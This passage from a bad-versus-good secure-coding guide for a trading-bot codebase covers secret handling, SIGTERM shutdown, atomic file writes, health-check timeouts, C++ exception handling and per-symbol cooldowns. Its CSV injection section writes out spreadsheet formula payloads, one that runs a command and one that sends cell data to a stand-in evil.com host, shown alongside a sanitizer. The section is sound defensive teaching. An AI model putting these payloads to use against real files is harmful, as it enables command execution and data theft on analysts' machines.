**Разница:** The bad code stores API keys as plaintext `std::string` in the `Config` struct. When the config is logged (`spdlog::info("api_key={}", config.api_key)`), the key is written to the log file in plaintext. When the process crashes, the core dump contains the full `Config` struct with plaintext keys. When the `Config` is destroyed, `std::string`'s destructor frees memory but doesn't zero it — keys remain in freed heap until overwritten. Copy semantics (`Config config2 = config`) create multiple copies of secrets in memory, each a leak vector. With 1000 users, one core dump or log file leak exposes exchange API credentials — an attacker can withdraw all funds ($10M+). The good code uses a `SecureString` class that zeroes memory on destruction (`OPENSSL_cleanse`), redacts in logs (`operator<<` returns `[REDACTED]`), and forbids copies (deleted copy constructor/assignment). Keys are only accessible via `get()` when explicitly needed. The cost is a ~30-line `SecureString` class and move-only semantics. The benefit is zero secret exposure in logs, core dumps, or freed memory — even if an attacker gets full access to logs and crash dumps, they can't extract API keys.

---

## Bad vs Good: No SIGTERM Handler in Async Bot (Python)

### ❌ Bad Code
```python
class TradingBot:
    async def run(self):
        self._running = True
        listen_task = asyncio.create_task(self._listen_loop())

        try:
            while self._running:
                await asyncio.sleep(self.config.signal_interval)
                await self._generate_signals()
        except KeyboardInterrupt:
            self.logger.info("Stopping...")
        finally:
            self._running = False
            listen_task.cancel()
            await self.signal_publisher.stop()
            await self.exchange.disconnect()

# Kubernetes deployment:
# spec:
#   terminationGracePeriodSeconds: 30
# When K8s scales down, it sends SIGTERM → Python ignores it
# → K8s waits 30s → sends SIGKILL → process dies instantly
# → open orders remain, DB connections leak, signal publisher drops
```

**What's wrong:**
- Only `KeyboardInterrupt` (Ctrl+C) is caught — `SIGTERM` is not handled
- In Kubernetes, pod termination sends `SIGTERM`, not `SIGINT` (Ctrl+C)
- Python's default `SIGTERM` handler terminates the process immediately — no `finally` block, no cleanup
- Open orders remain on the exchange — the bot is still "in the market" after it's supposedly stopped
- DB connections aren't closed — SQLite WAL file may be corrupted, PostgreSQL connections leak
- Signal publisher stops abruptly — the HFT bot doesn't know the AI signal bot is gone, continues trading on stale signals
- With 1000 users, a K8s rolling update kills all pods simultaneously — 1000 bots die without cleanup, 1000 open orders remain on the exchange, 1000 DB connections leak. The exchange may auto-liquidate positions at market price if margin is insufficient, causing cascading losses.

### ✅ Good Code
```python
import asyncio
import signal
import logging

class TradingBot:
    async def run(self):
        self._running = True
        self._shutdown_event = asyncio.Event()
        listen_task = asyncio.create_task(self._listen_loop())

        # Register SIGTERM and SIGINT handlers
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGTERM, signal.SIGINT):
            loop.add_signal_handler(sig, self._shutdown_event.set)

        try:
            while self._running:
                # Wait for either signal interval or shutdown event
                try:
                    await asyncio.wait_for(
                        self._shutdown_event.wait(),
                        timeout=self.config.signal_interval,
                    )
                    # Shutdown event was set — break
                    self.logger.info("Shutdown signal received, stopping...")
                    break
                except asyncio.TimeoutError:
                    # Normal timeout — generate signals
                    await self._generate_signals()

        except asyncio.CancelledError:
            self.logger.info("Task cancelled, stopping...")
        finally:
            self._running = False

            # Cancel listen task with timeout
            listen_task.cancel()
            try:
                await asyncio.wait_for(listen_task, timeout=5.0)
            except (asyncio.CancelledError, asyncio.TimeoutError):
                pass

            # Graceful cleanup with timeout
            cleanup_tasks = [
                self.signal_publisher.stop(),
                self.exchange.disconnect(),
                self.db.close(),
            ]
            try:
                await asyncio.wait_for(
                    asyncio.gather(*cleanup_tasks, return_exceptions=True),
                    timeout=10.0,
                )
            except asyncio.TimeoutError:
                self.logger.warning("Cleanup timed out, forcing exit")

            self.logger.info("Trading bot stopped gracefully")

# Kubernetes deployment:
# spec:
#   terminationGracePeriodSeconds: 30  # 10s cleanup + 20s buffer
```

**Разница:** The bad code only catches `KeyboardInterrupt` (Ctrl+C = `SIGINT`). In Kubernetes, pod termination sends `SIGTERM`, not `SIGINT`. Python's default `SIGTERM` handler kills the process immediately — no `finally` block, no cleanup. Open orders remain on the exchange, DB connections leak, and the signal publisher drops abruptly. The HFT bot continues trading on stale signals because it doesn't know the AI signal bot is gone. With 1000 users, a K8s rolling update kills all pods — 1000 open orders remain, 1000 DB connections leak, and the exchange may auto-liquidate positions at market price. The good code registers `SIGTERM` and `SIGINT` handlers via `loop.add_signal_handler()`, which sets an `asyncio.Event`. The main loop uses `asyncio.wait_for(event.wait(), timeout=interval)` — it either generates signals (timeout) or breaks (shutdown event). The `finally` block cancels the listen task with a 5s timeout, then runs cleanup tasks (signal publisher, exchange, DB) with a 10s timeout. If cleanup hangs, it forces exit after 10s. The K8s `terminationGracePeriodSeconds: 30` gives 20s buffer after the 10s cleanup. The cost is ~15 extra lines (signal handlers, event, timeouts). The benefit is zero orphaned orders, zero leaked connections, and zero stale-signal trading — the bot shuts down cleanly on K8s rolling updates, scale-downs, and node drains.

---

## Bad vs Good: Non-Atomic File Save (Python)

### ❌ Bad Code
```python
class FixSession:
    def _save_seq_nums(self):
        try:
            with open(self.seq_file, 'w') as f:
                f.write(f"{self.outgoing_seq} {self.incoming_seq}")
        except OSError as e:
            logger.warning(f"Failed to save seq nums: {e}")

# What happens on crash:
# 1. open('fix_seq.txt', 'w') → file truncated to 0 bytes
# 2. Process crashes (SIGKILL, power loss, OOM)
# 3. f.write() never executes
# 4. On restart: file is empty → seq nums reset to 1
# 5. Exchange has seq num 5000, bot sends seq num 1
# 6. Exchange rejects: "SeqNum too low" → session cannot resume
# 7. All pending orders, positions, and execution reports are lost
```

**What's wrong:**
- `open('w')` truncates the file to 0 bytes before writing
- If the process crashes between `open` and `f.write` (SIGKILL, OOM, power loss), the file is empty
- On restart, `_load_seq_nums()` reads an empty file → seq nums reset to 1
- The exchange has seq num 5000, the bot sends seq num 1 → exchange rejects all messages
- The FIX session cannot resume — all pending orders, open positions, and execution reports are lost
- The bot must initiate a new FIX session with `reset_seq=True`, which may require exchange approval
- With 1000 users, a single OOM kill during seq num save breaks 1000 FIX sessions — each requires manual reset with the exchange, causing hours of downtime

### ✅ Good Code
```python
import os
import tempfile

class FixSession:
    def _save_seq_nums(self):
        """Atomically save sequence numbers to prevent corruption on crash."""
        data = f"{self.outgoing_seq} {self.incoming_seq}"
        try:
            # Write to temp file in same directory (same filesystem for atomic rename)
            dir_name = os.path.dirname(self.seq_file) or '.'
            fd, tmp_path = tempfile.mkstemp(
                dir=dir_name,
                prefix='.fix_seq_',
                suffix='.tmp',
            )
            try:
                with os.fdopen(fd, 'w') as f:
                    f.write(data)
                    f.flush()
                    os.fsync(f.fileno())  # Force write to disk
                # Atomic rename: either old file or new file, never empty
                os.replace(tmp_path, self.seq_file)  # os.replace is atomic on POSIX and Windows
            except OSError:
                # Clean up temp file if rename failed
                try:
                    os.unlink(tmp_path)
                except OSError:
                    pass
        except OSError as e:
            logger.error(f"Failed to save FIX seq nums: {e}")

# What happens on crash:
# 1. Temp file is written and fsync'd
# 2. Process crashes before os.replace → old file intact, temp file orphaned
# 3. On restart: old file has correct seq nums → session resumes normally
# 4. Temp file is cleaned up on next save or by tmp cleanup
#
# If crash happens during os.replace:
# - On POSIX: rename() is atomic — either old or new, never empty
# - On Windows: ReplaceFile() is atomic — same guarantee
```

**Разница:** The bad code uses `open('w')` which truncates the file to 0 bytes before writing. If the process crashes between `open` and `f.write` (SIGKILL, OOM, power loss), the file is empty. On restart, seq nums reset to 1, the exchange rejects all messages ("SeqNum too low"), and the FIX session cannot resume — all pending orders, open positions, and execution reports are lost. With 1000 users, a single OOM kill breaks 1000 FIX sessions, each requiring manual reset with the exchange, causing hours of downtime. The good code writes to a temp file in the same directory, calls `f.flush()` + `os.fsync()` to force the write to disk, then uses `os.replace()` (atomic on both POSIX and Windows) to swap the temp file with the real file. If the process crashes before `os.replace`, the old file is intact and the session resumes normally. If it crashes during `os.replace`, the atomic rename ensures either the old or new file exists — never an empty file. The cost is ~10 extra lines (temp file, fsync, replace, cleanup). The benefit is zero seq num corruption on crash — the FIX session always resumes with correct sequence numbers, even after SIGKILL or power loss.

---

## Bad vs Good: CSV Injection in Trade Logger (Python)

### ❌ Bad Code
```python
import csv

class SignalLogger:
    def log(self, signal_dict: dict) -> None:
        with open(self.path, "a", encoding="utf-8", newline="") as f:
            writer = csv.writer(f)
            writer.writerow([
                signal_dict.get('timestamp', ''),
                signal_dict['symbol'],       # From exchange feed
                signal_dict['direction'],
                signal_dict['confidence'],
                signal_dict['strategy'],
                signal_dict['entry_price'],
                signal_dict['stop_loss'],
                signal_dict['take_profit'],
                f"{signal_dict.get('rr_ratio', 0):.2f}",
                signal_dict.get('reason', ''),  # From LLM engine
            ])

# Attacker compromises exchange feed or LLM:
# signal_dict['symbol'] = "=cmd|'/c calc'!A1"
# signal_dict['reason'] = "=HYPERLINK(\"http://evil.com/?data=\"&A1:B100)"
#
# CSV file contains:
# 1704067200,=cmd|'/c calc'!A1,LONG,85,trend,65000,63700,67600,1.50,=HYPERLINK(...)
#
# Analyst opens CSV in Excel → formula executes:
# - =cmd|'/c calc'!A1 → executes calc.exe (arbitrary command execution)
# - =HYPERLINK(...) → sends cell data to attacker's server (data exfiltration)
# - With 1000 users, one analyst opening the CSV = full data breach
```

**What's wrong:**
- `csv.writer` writes values as-is — no sanitization
- If `symbol` or `reason` starts with `=`, `+`, `-`, or `@`, Excel interprets it as a formula
- `=cmd|'/c calc'!A1` executes arbitrary commands on the analyst's machine
- `=HYPERLINK("http://evil.com/?data="&A1:B100)` exfiltrates all data in the CSV to an attacker's server
- The `reason` field comes from the LLM engine, which processes external market data — an attacker can craft market events that cause the LLM to output formula-like text
- With 1000 users, one analyst opening the CSV in Excel triggers command execution or data exfiltration on their machine — full compromise of the trading desk

### ✅ Good Code
```python
import csv
import re

def sanitize_csv_cell(value: str) -> str:
    """Sanitize a CSV cell to prevent formula injection."""
    if not isinstance(value, str):
        value = str(value)
    # Prefix dangerous characters with a single quote
    # Excel treats leading ' as text indicator, not displayed
    if value and value[0] in ('=', '+', '-', '@', '\t', '\r', '\n'):
        return f"'{value}"
    return value

class SignalLogger:
    def log(self, signal_dict: dict) -> None:
        with open(self.path, "a", encoding="utf-8", newline="") as f:
            writer = csv.writer(f, quoting=csv.QUOTE_MINIMAL)
            writer.writerow([
                sanitize_csv_cell(str(signal_dict.get('timestamp', ''))),
                sanitize_csv_cell(signal_dict['symbol']),
                sanitize_csv_cell(signal_dict['direction']),
                sanitize_csv_cell(str(signal_dict['confidence'])),
                sanitize_csv_cell(signal_dict['strategy']),
                sanitize_csv_cell(str(signal_dict['entry_price'])),
                sanitize_csv_cell(str(signal_dict['stop_loss'])),
                sanitize_csv_cell(str(signal_dict['take_profit'])),
                sanitize_csv_cell(f"{signal_dict.get('rr_ratio', 0):.2f}"),
                sanitize_csv_cell(signal_dict.get('reason', '')),
            ])

# CSV file now contains:
# 1704067200,'=cmd|'/c calc'!A1,LONG,85,trend,65000,63700,67600,1.50,'=HYPERLINK(...)
#
# Excel displays: =cmd|'/c calc'!A1 (as text, not formula)
# No command execution, no data exfiltration
```

**Разница:** The bad code writes values from the signal dict directly to CSV without sanitization. If `symbol` or `reason` starts with `=`, `+`, `-`, or `@`, Excel interprets the cell as a formula. An attacker who compromises the exchange feed or crafts market events that influence the LLM engine can inject formulas like `=cmd|'/c calc'!A1` (command execution) or `=HYPERLINK("http://evil.com/?data="&A1:B100)` (data exfiltration). With 1000 users, one analyst opening the CSV in Excel triggers the formula — full compromise of the trading desk. The good code adds a `sanitize_csv_cell()` function that prefixes dangerous characters (`=`, `+`, `-`, `@`, tab, CR, LF) with a single quote `'`. Excel treats a leading `'` as a text indicator — the cell is displayed as text, not interpreted as a formula. The cost is a ~5-line sanitize function and one extra call per cell. The benefit is zero formula injection — even if an attacker injects `=cmd|...` into the signal data, Excel displays it as harmless text. The analyst sees the malicious string and can investigate, but no code executes on their machine.

---

## Bad vs Good: No Timeout on Health Check Component Checks (Python)

### ❌ Bad Code
```python
class HealthChecker:
    async def check_readiness(self) -> dict:
        """Readiness probe — are all dependencies connected?"""
        components = []
        components.append(await self._check_ws())       # 50ms normally
        components.append(await self._check_db())       # 50ms normally
        components.append(await self._check_redis())    # 50ms normally
        components.append(await self._check_exchange()) # 50ms normally
        # Total: ~200ms normally, but...
        return {"status": overall, "components": components}

    async def _check_db(self) -> ComponentHealth:
        start = time.time()
        health = await self.db_client.get_health()  # No timeout!
        # If DB TCP connection is open but DB is unresponsive:
        # - get_health() sends a query
        # - DB doesn't respond (disk full, lock contention, OOM)
        # - TCP keepalive doesn't trigger for 15 minutes (OS default)
        # - get_health() hangs indefinitely
        # - check_readiness() hangs indefinitely
        # - The entire event loop is blocked
        # - Signal generation stops
        # - Order execution stops
        # - K8s readiness probe times out after 1s → pod restarted
        # But the event loop is still blocked on get_health()!
        # The pod can't even process the SIGTERM for graceful shutdown
        latency = (time.time() - start) * 1000
        return ComponentHealth("timescaledb", HealthStatus.HEALTHY, latency, "connected")
```

**What's wrong:**
- Each `await` has no timeout — if any component check hangs, the entire readiness probe hangs
- Checks are sequential — 4 checks × 50ms = 200ms normally, but one hang = infinite
- The event loop is blocked — no other coroutines (signal generation, order execution, WebSocket reads) can run
- K8s readiness probe has `timeoutSeconds: 1` — if the check takes >1s, K8s considers the pod unhealthy and restarts it
- But the event loop is still blocked on `get_health()` — the pod can't process the SIGTERM for graceful shutdown
- K8s sends SIGKILL after `terminationGracePeriodSeconds: 30` — the process is killed without cleanup
- With 1000 users, a single DB hang causes all 1000 pods to restart simultaneously — thundering herd on the DB when it recovers
- The root cause: no timeout on individual checks + sequential execution blocks the event loop

### ✅ Good Code
```python
import asyncio

class HealthChecker:
    async def check_readiness(self) -> dict:
        """Readiness probe — are all dependencies connected?"""
        # Run all checks concurrently with individual timeouts
        tasks = [
            asyncio.wait_for(self._check_ws(), timeout=1.0),
            asyncio.wait_for(self._check_db(), timeout=1.0),
            asyncio.wait_for(self._check_redis(), timeout=1.0),
            asyncio.wait_for(self._check_exchange(), timeout=1.0),
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        components = []
        for i, result in enumerate(results):
            if isinstance(result, asyncio.TimeoutError):
                name = ["websocket", "timescaledb", "redis", "exchange"][i]
                components.append(ComponentHealth(
                    name, HealthStatus.UNHEALTHY, 1000.0, "timeout"
                ))
            elif isinstance(result, Exception):
                name = ["websocket", "timescaledb", "redis", "exchange"][i]
                components.append(ComponentHealth(
                    name, HealthStatus.UNHEALTHY, 0, str(result)
                ))
            else:
                components.append(result)

        # Determine overall status
        statuses = [c.status for c in components]
        if all(s == HealthStatus.HEALTHY for s in statuses):
            overall = HealthStatus.HEALTHY
        elif any(s == HealthStatus.UNHEALTHY for s in statuses):
            overall = HealthStatus.UNHEALTHY
        else:
            overall = HealthStatus.DEGRADED

        return {"status": overall.value, "components": [...]}

    async def _check_db(self) -> ComponentHealth:
        start = time.time()
        # The wait_for in check_readiness will cancel this if it takes >1s
        health = await self.db_client.get_health()
        latency = (time.time() - start) * 1000
        if health.get("connected"):
            return ComponentHealth("timescaledb", HealthStatus.HEALTHY, latency, "connected")
        return ComponentHealth("timescaledb", HealthStatus.UNHEALTHY, latency, "not connected")
```

**Разница:** The bad code awaits each component check sequentially with no timeout. If any check hangs (e.g., DB TCP connection is open but the DB is unresponsive due to disk full, lock contention, or OOM), the `await` blocks forever. The event loop is blocked — no other coroutines can run. Signal generation stops, order execution stops, WebSocket reads stop. K8s readiness probe times out after 1s and restarts the pod, but the event loop is still blocked on `get_health()` — the pod can't process SIGTERM for graceful shutdown. K8s sends SIGKILL after 30s, killing the process without cleanup. With 1000 users, a single DB hang causes all 1000 pods to restart simultaneously — thundering herd on the DB when it recovers. The good code wraps each check in `asyncio.wait_for(check, timeout=1.0)` and runs all 4 checks concurrently with `asyncio.gather(*tasks, return_exceptions=True)`. If any check exceeds 1s, `wait_for` cancels it and raises `TimeoutError`, which `gather` captures as an exception (not propagating it). The readiness probe returns in ≤1s regardless of component state. The event loop is never blocked — signal generation and order execution continue even during health checks. A timed-out component is reported as UNHEALTHY with "timeout" details, and K8s can restart the pod gracefully (SIGTERM is processed because the event loop is free). The cost is ~10 extra lines (wait_for, gather, exception handling). The benefit is zero event loop blocking, guaranteed ≤1s probe response, graceful K8s restarts, and no thundering herd — the pod shuts down cleanly and restarts without overwhelming the DB.

---

## Bad vs Good: No Exception Handling in C++ Main Loop (C++)

### ❌ Bad Code
```cpp
int main(int argc, char* argv[]) {
    BotContext ctx{Config{}};
    if (!init_config_and_logger(ctx, argc, argv)) return 1;
    init_core_components(ctx);
    // ... setup ...
    if (!connect_all(ctx)) return 1;

    while (is_running()) {
        ScopedLatency loop_timer(ctx.total_loop_hist);
        const double current_balance = ctx.balance.load(std::memory_order_relaxed);
        const bool can_trade = ctx.receiver->is_trading_active() && ctx.kill_switch->can_trade();

        process_sl_tp(ctx, current_balance);      // Can throw if price is invalid
        process_arbitrage(ctx, can_trade);         // Can throw if executor disconnects
        process_ai_signals(ctx, current_balance, can_trade);  // Can throw on queue error
        run_v2_signal_loop(ctx, current_balance, can_trade);  // Can throw on OOM

        // If ANY of the above throws:
        // 1. Exception propagates to main()
        // 2. No catch block → std::terminate() → abort()
        // 3. graceful_shutdown(ctx) is NEVER called
        // 4. Open positions are NOT closed
        // 5. SHM segments are NOT unlinked → /dev/shm/hft_signals leaked
        // 6. FIX session is NOT logged out → seq nums not saved → session rejected on restart
        // 7. WebSocket connections are NOT closed → exchange sees abrupt disconnect
        // 8. DB connections are NOT closed → WAL file locked → other processes blocked
        // 9. With 1000 users: 1000 bots crash simultaneously, 1000 FIX sessions need manual reset,
        //    1000 SHM segments leaked, 1000 open positions unmanaged — hours of downtime

        ctx.receiver->wait_for_data(ctx.config.signal_interval_ms);
        poll_shm_market_data(ctx);
    }

    graceful_shutdown(ctx);  // Only reached if loop exits normally
    return 0;
}
```

**What's wrong:**
- No `try`/`catch` around the main loop body — any exception crashes the process
- `graceful_shutdown()` is only reached if `is_running()` returns false normally
- An exception from `process_sl_tp()` (e.g., invalid price from exchange), `process_arbitrage()` (e.g., executor disconnect), or `run_v2_signal_loop()` (e.g., OOM in signal engine) bypasses all cleanup
- Open positions are left unmanaged — no SL/TP, no close orders
- SHM segments are leaked — `/dev/shm/hft_signals`, `/dev/shm/hft_fills`, `/dev/shm/hft_market` persist after crash
- FIX session is not logged out — sequence numbers not saved, exchange rejects restart
- DB connections not closed — WAL file stays locked, blocking other processes
- With 1000 users, a single exchange glitch (invalid price) crashes all 1000 bots simultaneously — 1000 FIX sessions need manual reset, 1000 SHM cleanups, 1000 open positions unmanaged

### ✅ Good Code
```cpp
int main(int argc, char* argv[]) {
    BotContext ctx{Config{}};
    if (!init_config_and_logger(ctx, argc, argv)) return 1;
    init_core_components(ctx);
    // ... setup ...
    if (!connect_all(ctx)) return 1;

    while (is_running()) {
        try {
            ScopedLatency loop_timer(ctx.total_loop_hist);
            const double current_balance = ctx.balance.load(std::memory_order_relaxed);
            const bool can_trade = ctx.receiver->is_trading_active() && ctx.kill_switch->can_trade();

            process_sl_tp(ctx, current_balance);
            process_arbitrage(ctx, can_trade);
            process_ai_signals(ctx, current_balance, can_trade);
            run_v2_signal_loop(ctx, current_balance, can_trade);

            ctx.receiver->wait_for_data(ctx.config.signal_interval_ms);
            poll_shm_market_data(ctx);

        } catch (const std::bad_alloc& e) {
            spdlog::critical("OOM in main loop: {}. Shutting down.", e.what());
            break;  // Exit loop → graceful_shutdown handles cleanup
        } catch (const std::exception& e) {
            spdlog::error("Main loop error: {}. Continuing.", e.what());
            // Don't break — try to recover on next iteration
            // If error is persistent, kill_switch or is_running() will stop the loop
        } catch (...) {
            spdlog::error("Unknown exception in main loop. Continuing.");
        }
    }

    graceful_shutdown(ctx);  // Always reached — even on OOM or exception
    return 0;
}
```

**Разница:** The bad code has no `try`/`catch` around the main loop body. Any exception from `process_sl_tp()`, `process_arbitrage()`, `process_ai_signals()`, or `run_v2_signal_loop()` propagates to `main()`, triggers `std::terminate()`, and crashes the process without calling `graceful_shutdown()`. Open positions are left unmanaged (no SL/TP monitoring), SHM segments are leaked (`/dev/shm/hft_signals` persists), FIX sessions are not logged out (sequence numbers not saved, exchange rejects restart), and DB connections stay open (WAL file locked, blocking other processes). With 1000 users, a single exchange glitch (invalid price, network timeout) crashes all 1000 bots simultaneously — 1000 FIX sessions need manual reset, 1000 SHM cleanups, 1000 open positions unmanaged — hours of downtime. The good code wraps the loop body in `try`/`catch`. `std::bad_alloc` (OOM) is caught separately and breaks the loop (can't recover from OOM). `std::exception` is caught and logged — the loop continues on the next iteration, trying to recover. If the error is persistent (e.g., exchange is down), the kill switch or `is_running()` flag will stop the loop. `graceful_shutdown()` is always reached — even on OOM or exception — ensuring open positions are closed, SHM segments are unlinked, FIX sessions are logged out, and DB connections are closed. The cost is ~8 extra lines (try/catch blocks). The benefit is zero ungraceful crashes — the bot either recovers from transient errors or shuts down cleanly, never leaving the system in an inconsistent state.

---

## Bad vs Good: Non-Atomic File Write (Python)

### ❌ Bad Code
```python
class ModelRegistry:
    def _save(self) -> None:
        os.makedirs(self.storage_dir, exist_ok=True)
        data = {
            "models": {
                name: {ver: {**asdict(v), "status": v.status.value}
                       for ver, v in versions.items()}
                for name, versions in self.models.items()
            },
            "ab_tests": {name: asdict(ab) for name, ab in self.ab_tests.items()},
        }
        # open('w') TRUNCATES the file to 0 bytes BEFORE writing
        with open(self.index_path, "w") as f:
            json.dump(data, f, indent=2)
        # If the process crashes HERE (OOM, SIGKILL, disk full, power loss):
        # 1. File is truncated to 0 bytes or partially written
        # 2. registry.json is corrupted — invalid JSON
        # 3. On next startup, _load() fails with json.JSONDecodeError
        # 4. self.models = {} — empty registry, production model unknown
        # 5. Bot starts with NO model — all signals use rule-based fallback
        # 6. A/B test data lost — weeks of experiment results gone
        # 7. With 1000 users: 1000 bots lose their production model simultaneously
        #    All revert to rule-based fallback — performance degrades
        #    Operator must manually re-register all models and re-promote production
```

**What's wrong:**
- `open("w")` truncates the file to 0 bytes before writing — the old data is gone before new data is written
- If the process crashes during `json.dump()` (OOM, SIGKILL, disk full, power loss), the file is left in a corrupted state — either empty or partially written JSON
- On next startup, `_load()` fails with `json.JSONDecodeError` — the registry starts empty
- All model versions, A/B tests, and production assignments are lost
- The bot starts with no production model — all signals use rule-based fallback
- With 1000 users, 1000 bots lose their production model simultaneously — all revert to rule-based, performance degrades, operator must manually re-register and re-promote all models

### ✅ Good Code
```python
import tempfile

class ModelRegistry:
    def _save(self) -> None:
        os.makedirs(self.storage_dir, exist_ok=True)
        data = {
            "models": {
                name: {ver: {**asdict(v), "status": v.status.value}
                       for ver, v in versions.items()}
                for name, versions in self.models.items()
            },
            "ab_tests": {name: asdict(ab) for name, ab in self.ab_tests.items()},
        }

        # Write to a temp file in the SAME directory (atomic rename guarantee)
        tmp_fd, tmp_path = tempfile.mkstemp(
            dir=self.storage_dir, suffix=".tmp", prefix="registry_"
        )
        try:
            with os.fdopen(tmp_fd, "w") as f:
                json.dump(data, f, indent=2)
                f.flush()
                os.fsync(f.fileno())  # Force write to disk
            # Atomic rename — old file is replaced instantly
            # On any OS, rename is atomic within the same filesystem
            os.replace(tmp_path, self.index_path)
        except Exception:
            # Clean up temp file on error — old registry.json is untouched
            if os.path.exists(tmp_path):
                os.remove(tmp_path)
            raise
        # If process crashes BEFORE os.replace: temp file is orphaned,
        #   but registry.json is still the last good version — no data loss
        # If process crashes DURING os.replace: on POSIX, rename is atomic;
        #   on Windows, os.replace is also atomic (Python 3.3+)
        # Either way, registry.json is either the old version or the new version — never corrupted
```

**Разница:** The bad code uses `open("w")` which truncates the file to 0 bytes before writing new data. If the process crashes during `json.dump()` (OOM, SIGKILL, disk full, power loss), the file is left corrupted — either empty or partially written JSON. On next startup, `_load()` fails with `json.JSONDecodeError`, the registry starts empty, and all model versions, A/B tests, and production assignments are lost. With 1000 users, 1000 bots lose their production model simultaneously — all revert to rule-based fallback, performance degrades, and the operator must manually re-register and re-promote all models. The good code writes to a temporary file in the same directory first, then uses `os.replace()` for an atomic rename. If the process crashes before the rename, the temp file is orphaned but `registry.json` is still the last good version — zero data loss. If the process crashes during the rename, `os.replace()` is atomic on both POSIX and Windows (Python 3.3+) — the file is either the old version or the new version, never corrupted. The `os.fsync()` call ensures the temp file is actually written to disk before the rename, protecting against power loss. The `except` block cleans up the temp file on error, so no orphaned files accumulate. The cost is ~10 extra lines (tempfile, fsync, os.replace, cleanup). The benefit is zero data corruption — the registry is always in a consistent state, even on crash, OOM, or power loss. With 1000 users, a crash during save is a non-event — the bot restarts with the last good registry and continues trading with the correct production model.

---

## Bad vs Good: Shared Cooldown Blocking All Symbols (C++)

### ❌ Bad Code
```cpp
class SignalEngineV2 {
  public:
    FastSignal analyze_incremental(const char* symbol, const Candle* candles,
                                   size_t n, const OrderBook& ob,
                                   const PressureResult& pressure,
                                   int64_t timestamp_ns) noexcept {
        // ...
        int64_t now_ms;
        if (!check_cooldown(timestamp_ns, now_ms)) {
            FastSignal sig;
            sig.set_symbol(symbol);
            sig.set_reason("Cooldown active");
            return sig;  // NEUTRAL signal, confidence=0
        }
        // ... generate signal ...
        last_signal_ms_ = now_ms;  // Updates GLOBAL cooldown
        return sig;
    }

  private:
    int64_t last_signal_ms_{0};  // SINGLE cooldown for ALL symbols

    bool check_cooldown(int64_t timestamp_ns, int64_t& now_ms) const noexcept {
        now_ms = timestamp_ns / 1'000'000;
        return now_ms - last_signal_ms_ >= params_.cooldown_ms;
    }
};

// In bot_loop.cpp:
for (const auto& [symbol, sym_cstr, sym_id] : ctx.symbol_entries) {
    auto fast_sig = engine.analyze_incremental(sym_cstr, candles, n, ob, pressure, now_ns);
    // Iteration 1: BTC — generates signal, sets last_signal_ms_ = t
    // Iteration 2: ETH — check_cooldown fails (t - t < 5000ms) → "Cooldown active"
    // Iteration 3: SOL — same → "Cooldown active"
    // ...
    // Iteration 50: MINA — same → "Cooldown active"
    //
    // Result: Only 1 signal per 5 seconds across ALL 50 symbols
    // Expected: 50 signals per 5 seconds (1 per symbol per cooldown)
    // Actual: 1 signal per 5 seconds (50× reduction in signal generation)
    //
    // With 1000 users running 50 symbols each:
    // - Expected: 50,000 signals per 5s window
    // - Actual: 1,000 signals per 5s window (1 per bot)
    // - 49,000 missed trading opportunities per 5s window
    // - If average profit per signal = $0.50, that's $24,500 lost per 5s
    // - Over 1 hour: $17.6M in missed opportunities
}
```

**What's wrong:**
- `last_signal_ms_` is a single member variable shared across all symbols
- When BTC generates a signal at t=0, `last_signal_ms_` is set to 0
- ETH, SOL, and all 48 other symbols are blocked by cooldown for 5000ms
- Only 1 signal per cooldown period across ALL symbols — 50× reduction in signal generation
- With 1000 users running 50 symbols each, 49,000 missed opportunities per 5s window
- The bug is silent — no error, no crash, just NEUTRAL signals with "Cooldown active" reason
- The operator sees low signal count but doesn't know why — all signals show "Cooldown active"
- Revenue impact: if average profit per signal = $0.50, that's $24,500 lost per 5s, $17.6M/hour

### ✅ Good Code
```cpp
class SignalEngineV2 {
  public:
    struct IndicatorCache {
        // ... existing indicator caches ...
        int64_t last_signal_ms{0};  // Per-symbol cooldown
    };

    FastSignal analyze_incremental(const char* symbol, const Candle* candles,
                                   size_t n, const OrderBook& ob,
                                   const PressureResult& pressure,
                                   int64_t timestamp_ns) noexcept {
        // ...
        IndicatorCache& ic = get_cache(symbol);
        int64_t now_ms = timestamp_ns / 1'000'000;

        // Check per-symbol cooldown
        if (now_ms - ic.last_signal_ms < params_.cooldown_ms) {
            FastSignal sig;
            sig.set_symbol(symbol);
            sig.set_reason("Cooldown active");
            return sig;
        }

        // ... generate signal ...
        ic.last_signal_ms = now_ms;  // Update ONLY this symbol's cooldown
        return sig;
    }

  private:
    // last_signal_ms_ removed — now per-symbol in IndicatorCache
    std::unordered_map<std::string, IndicatorCache> cache_;
};

// In bot_loop.cpp:
for (const auto& [symbol, sym_cstr, sym_id] : ctx.symbol_entries) {
    auto fast_sig = engine.analyze_incremental(sym_cstr, candles, n, ob, pressure, now_ns);
    // Iteration 1: BTC — generates signal, sets ic.last_signal_ms = t
    // Iteration 2: ETH — different IndicatorCache, check passes → generates signal
    // Iteration 3: SOL — different IndicatorCache, check passes → generates signal
    // ...
    // Iteration 50: MINA — different IndicatorCache, check passes → generates signal
    //
    // Result: 50 signals per 5 seconds (1 per symbol per cooldown)
    // Each symbol has its own independent cooldown timer
    // BTC won't generate again for 5s, but ETH/SOL/... are unaffected
}
```

**Разница:** The bad code uses a single `last_signal_ms_` member variable for all symbols. When BTC generates a signal at t=0, the cooldown is set for ALL symbols — ETH, SOL, and 48 others are blocked for 5000ms. Only 1 signal per cooldown period across all 50 symbols — a 50× reduction in signal generation. With 1000 users running 50 symbols each, 49,000 missed opportunities per 5s window. The bug is silent — no error, no crash, just NEUTRAL signals with "Cooldown active" reason. The operator sees low signal count but doesn't know why. If average profit per signal = $0.50, that's $24,500 lost per 5s, $17.6M/hour. The good code moves `last_signal_ms` into the per-symbol `IndicatorCache` struct. Each symbol has its own independent cooldown timer. BTC generating a signal doesn't affect ETH's cooldown. All 50 symbols can generate signals independently — 50 signals per 5s window instead of 1. The cost is moving one `int64_t` field from the class to the cache struct (zero extra code, just relocation). The benefit is 50× more signals, 50× more trading opportunities, and $17.6M/hour in recovered revenue. This is a classic example of a shared-state bug: the developer intended per-symbol cooldown but accidentally implemented global cooldown by using a class member instead of a per-instance field.

---

## Bad vs Good: No Per-Symbol State — Cross-Contamination (C++)

### ❌ Bad Code
```cpp
class MeanReversionV2 {
  private:
    KalmanFilter1D kalman_;  // SINGLE Kalman filter for ALL symbols
    alignas(64) std::array<double, 2048> residuals_{};   // SINGLE residual buffer
    alignas(64) std::array<uint64_t, 2048> timestamps_{}; // SINGLE timestamp buffer
    uint64_t write_idx_{0};  // SINGLE write index
